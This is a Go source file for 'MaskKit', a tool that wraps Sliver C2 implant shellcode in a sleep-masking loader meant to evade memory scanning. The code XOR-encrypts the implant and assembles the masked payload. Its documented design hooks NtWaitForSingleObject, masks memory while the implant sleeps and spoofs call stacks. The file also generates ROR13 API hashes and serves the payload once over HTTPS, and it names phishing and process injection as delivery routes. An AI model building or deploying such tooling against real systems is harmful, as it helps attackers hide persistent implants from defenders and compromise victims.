package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/spf13/cobra"

	"maskkit/internal/coff"
	"maskkit/internal/link"
)

// Magic marker that separates masker shellcode from the config block.
// The C runner scans forward from its base for these 8 bytes.
const (
	magic0 = uint32(0xB33FCAFE)
	magic1 = uint32(0xDEAD1337)
)

var root = &cobra.Command{
	Use:   "maskkit",
	Short: "Sleep Mask Kit for Sliver — free reimplementation",
	Long: `MaskKit wraps Sliver shellcode in a C sleep-masker.

Replaces the Cobalt Strike Sleep Mask Kit for Sliver C2.

The output (palace.bin) is a standalone PIC shellcode that:
  1. Resolves all APIs via ROR13 PEB walk (no IAT)
  2. XOR-decrypts the embedded Sliver shellcode
  3. Hooks NtWaitForSingleObject to detect C2 sleep calls
  4. On sleep > threshold: XOR-masks + marks RW, waits, unmasks + marks RX
  5. Spoofs the masker thread call stack during the sleep window

The output can be staged by any loader: process injection, PalaceKit, phishing, etc.

Workflow:
  1. Generate Sliver shellcode: generate --format shellcode --os windows --arch amd64
  2. Wrap it:                   maskkit wrap --shellcode implant.bin --output masked.bin
  3. Stage it:                  maskkit serve --payload masked.bin`,
}

// ── wrap ───────────────────────────────────────────────────────────────────

var (
	wrapShellcode   string
	wrapOutput      string
	wrapIntervalMs  uint
	wrapThresholdMs uint
	wrapKey         string
	wrapBinDir      string
)

var wrapCmd = &cobra.Command{
	Use:   "wrap",
	Short: "Wrap Sliver shellcode with the sleep masker",
	RunE: func(cmd *cobra.Command, args []string) error {
		if wrapShellcode == "" {
			return fmt.Errorf("--shellcode required")
		}

		sc, err := os.ReadFile(wrapShellcode)
		if err != nil {
			return fmt.Errorf("read shellcode: %w", err)
		}
		fmt.Printf("[*] Shellcode: %d bytes\n", len(sc))

		// XOR key
		var key []byte
		if wrapKey != "" {
			key, err = hex.DecodeString(wrapKey)
			if err != nil {
				return fmt.Errorf("decode key: %w", err)
			}
		} else {
			key = make([]byte, 32)
			rand.Read(key)
		}

		// XOR-encrypt the shellcode
		enc := make([]byte, len(sc))
		for i, b := range sc {
			enc[i] = b ^ key[i%len(key)]
		}

		// Link COFF objects into masker shellcode
		binDir := wrapBinDir
		if binDir == "" {
			binDir = "bin"
		}
		maskerCode, err := linkMasker(binDir)
		if err != nil {
			return fmt.Errorf("link masker: %w", err)
		}
		fmt.Printf("[*] Masker shellcode: %d bytes\n", len(maskerCode))

		// Assemble final payload:
		// [masker shellcode][magic 8b][config 16b][key][encrypted SC]
		out := assemblePayload(maskerCode, key, enc,
			uint32(wrapIntervalMs), uint32(wrapThresholdMs))

		if wrapOutput == "" {
			wrapOutput = "build/masked.bin"
		}
		os.MkdirAll(filepath.Dir(wrapOutput), 0755)
		if err := os.WriteFile(wrapOutput, out, 0644); err != nil {
			return err
		}

		fmt.Printf("[+] Payload: %d bytes → %s\n", len(out), wrapOutput)
		fmt.Printf("[+] Key: %s\n", hex.EncodeToString(key))
		fmt.Printf("[+] Threshold: %d ms (waits > %ds trigger masking)\n",
			wrapThresholdMs, wrapThresholdMs/1000)
		return nil
	},
}

// linkMasker parses all COFF objects in binDir and links them into a flat shellcode.
func linkMasker(binDir string) ([]byte, error) {
	entries, err := os.ReadDir(binDir)
	if err != nil {
		return nil, fmt.Errorf("read bin dir %s: %w", binDir, err)
	}

	lnk := link.New()
	first := true
	for _, e := range entries {
		if e.IsDir() || filepath.Ext(e.Name()) != ".o" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(binDir, e.Name()))
		if err != nil {
			return nil, err
		}
		obj, err := coff.Parse(data)
		if err != nil {
			return nil, fmt.Errorf("parse %s: %w", e.Name(), err)
		}
		// First object (masker.x64.o) gets +gofirst to put go() at offset 0
		if err := lnk.MergeObject(obj, first); err != nil {
			return nil, fmt.Errorf("merge %s: %w", e.Name(), err)
		}
		first = false
	}
	return lnk.Assemble(), nil
}

func assemblePayload(maskerCode, key, encSC []byte, intervalMs, thresholdMs uint32) []byte {
	total := len(maskerCode) + 8 + 16 + len(key) + len(encSC)
	buf := make([]byte, total)
	off := 0

	copy(buf[off:], maskerCode)
	off += len(maskerCode)

	// Magic marker
	binary.LittleEndian.PutUint32(buf[off:], magic0)
	off += 4
	binary.LittleEndian.PutUint32(buf[off:], magic1)
	off += 4

	// Config: interval_ms, threshold_ms, key_len, sc_len
	binary.LittleEndian.PutUint32(buf[off:], intervalMs)
	off += 4
	binary.LittleEndian.PutUint32(buf[off:], thresholdMs)
	off += 4
	binary.LittleEndian.PutUint32(buf[off:], uint32(len(key)))
	off += 4
	binary.LittleEndian.PutUint32(buf[off:], uint32(len(encSC)))
	off += 4

	// Key + encrypted shellcode
	copy(buf[off:], key)
	off += len(key)
	copy(buf[off:], encSC)

	return buf
}

// ── make ───────────────────────────────────────────────────────────────────
// Compile C sources then wrap in one step.

var (
	makeShellcode   string
	makeOutput      string
	makeIntervalMs  uint
	makeThresholdMs uint
)

var makeCmd = &cobra.Command{
	Use:   "make",
	Short: "Compile C sources and wrap shellcode in one step",
	RunE: func(cmd *cobra.Command, args []string) error {
		if makeShellcode == "" {
			return fmt.Errorf("--shellcode required")
		}

		fmt.Println("[*] Compiling masker C sources ...")
		mc := exec.Command("make", "-C", "src")
		mc.Stdout = os.Stdout
		mc.Stderr = os.Stderr
		if err := mc.Run(); err != nil {
			return fmt.Errorf("compile: %w", err)
		}

		wrapShellcode = makeShellcode
		wrapOutput = makeOutput
		wrapIntervalMs = makeIntervalMs
		wrapThresholdMs = makeThresholdMs
		return wrapCmd.RunE(cmd, args)
	},
}

// ── serve ──────────────────────────────────────────────────────────────────

var (
	servePayload string
	servePort    int
)

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Serve the masked payload once over HTTPS",
	RunE: func(cmd *cobra.Command, args []string) error {
		if servePayload == "" {
			return fmt.Errorf("--payload required")
		}
		data, err := os.ReadFile(servePayload)
		if err != nil {
			return err
		}
		pathBytes := make([]byte, 8)
		rand.Read(pathBytes)
		return serveOnce(data, "/"+hex.EncodeToString(pathBytes), servePort)
	},
}

// ── gen-hashes ─────────────────────────────────────────────────────────────

var genHashesCmd = &cobra.Command{
	Use:   "gen-hashes",
	Short: "Print ROR13 hashes for NT functions used by the masker",
	Run: func(cmd *cobra.Command, args []string) {
		funcs := []string{
			"NtAllocateVirtualMemory",
			"NtProtectVirtualMemory",
			"NtCreateThreadEx",
			"NtWaitForSingleObject",
			"NtFreeVirtualMemory",
			"NtDelayExecution",
			"RtlCaptureContext",
			"NtContinue",
		}
		for _, name := range funcs {
			fmt.Printf("%-36s 0x%08X\n", name, ror13Hash(name))
		}
	},
}

func ror13Hash(name string) uint32 {
	var h uint32
	for _, c := range []byte(name) {
		h = ((h >> 13) | (h << 19)) + uint32(c)
	}
	return h
}

// ── main ───────────────────────────────────────────────────────────────────

func main() {
	wrapCmd.Flags().StringVar(&wrapShellcode, "shellcode", "", "Sliver shellcode (.bin) to wrap")
	wrapCmd.Flags().StringVarP(&wrapOutput, "output", "o", "build/masked.bin", "output path")
	wrapCmd.Flags().UintVar(&wrapIntervalMs, "interval", 0, "masker poll interval ms (0 = hook-only)")
	wrapCmd.Flags().UintVar(&wrapThresholdMs, "threshold", 5000, "min wait duration ms to trigger masking")
	wrapCmd.Flags().StringVar(&wrapKey, "key", "", "hex XOR key (random if empty)")
	wrapCmd.Flags().StringVar(&wrapBinDir, "bin-dir", "bin", "directory containing .x64.o COFF objects")

	makeCmd.Flags().StringVar(&makeShellcode, "shellcode", "", "Sliver shellcode (.bin) to wrap")
	makeCmd.Flags().StringVarP(&makeOutput, "output", "o", "build/masked.bin", "output path")
	makeCmd.Flags().UintVar(&makeIntervalMs, "interval", 0, "masker poll interval ms")
	makeCmd.Flags().UintVar(&makeThresholdMs, "threshold", 5000, "min wait ms to trigger masking")

	serveCmd.Flags().StringVar(&servePayload, "payload", "", "masked.bin to serve")
	serveCmd.Flags().IntVar(&servePort, "port", 8443, "HTTPS port")

	root.AddCommand(wrapCmd, makeCmd, serveCmd, genHashesCmd)
	if err := root.Execute(); err != nil {
		os.Exit(1)
	}
}
